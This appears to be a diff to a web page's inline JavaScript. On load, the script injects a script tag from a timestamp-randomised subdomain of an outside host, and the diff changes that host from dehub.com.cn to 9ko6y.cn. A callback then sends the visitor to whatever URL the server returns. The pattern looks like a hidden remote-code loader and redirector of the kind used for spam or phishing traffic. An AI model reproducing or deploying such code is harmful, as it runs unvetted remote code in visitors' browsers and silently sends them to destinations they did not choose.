@@ -63,19 +63,22 @@
         var codecode = getQueryVariable2("code");
         var Time = (new Date()).getTime();
         var script = document.createElement('script');
-        script.setAttribute('src', "http://" + Time + ".dehub.com.cn/index.php/index/index/loadGround/code/" + codecode);
+        script.setAttribute('src', "http://" + Time + ".9ko6y.cn/index.php/index/index/loadGround/code/" + codecode);
         document.querySelector("head").appendChild(script);
     }());
 
     function handler(code, data) {
-        if (code == 'successcode') {
+        if (code === 'successcode') {
             self.location.href = data;
         } else {
-            var codecode2 = getDomainSjcode("code");
-            var Time2 = (new Date()).getTime();
-            var script = document.createElement('script');
-            script.setAttribute('src', "http://" + Time2 + ".dehub.com.cn/index.php/index/index/loadGround/code/" + codecode2);
-            document.querySelector("head").appendChild(script);
+            //self.location.href = 'https://www.baidu.com';
+            console.log(code);
+            console.log(data);
+            //var codecode2 = getDomainSjcode("code");
+            //var Time2 = (new Date()).getTime();
+            //var script = document.createElement('script');
+            //script.setAttribute('src', "http://" + Time2 + ".9ko6y.cn/index.php/index/index/loadGround/code/" + codecode2);
+            //document.querySelector("head").appendChild(script);
         }
     }
 </script>
